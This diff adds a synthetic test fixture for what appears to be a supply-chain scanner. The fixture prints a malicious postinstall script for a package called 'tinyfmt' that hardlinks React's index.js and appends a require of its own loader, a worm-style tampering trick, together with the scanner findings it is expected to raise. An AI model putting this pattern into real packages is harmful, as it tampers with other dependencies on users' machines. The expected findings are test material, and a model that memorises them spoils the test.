@@ -1,0 +1,76 @@
+{
+  "id": "install-root-link-class-field",
+  "title": "Existing postinstall hook hardlinks a sibling file and writes it from a class field initialiser",
+  "category": "install-time-self-propagation",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "A hardlink from a sibling package's file into the package, written from a class field initialiser so the write's order relative to the link is not obvious from the text. Pins the shape that slipped past an attempt to prove install-time writes stay in the package; it stays high because the source names node_modules and writes. Inert fixture.",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 34,
+      "sha256": "prev-install-js",
+      "flags": [],
+      "textSample": "console.log('tinyfmt installed');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 295,
+      "sha256": "staged-install-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\nconst SRC = path.join(__dirname, '..', '..', 'node_modules', 'react', 'index.js');\nconst own = path.join(__dirname, 'h.js');\nclass A { x = fs.appendFileSync(own, \"require('tinyfmt/loader');\\n\"); }\nfs.linkSync(SRC, own);\nnew A();\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "install.js"
+    }
+  ],
+  "expectedReleaseRisk": "high",
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "install.js"
+    }
+  ]
+}
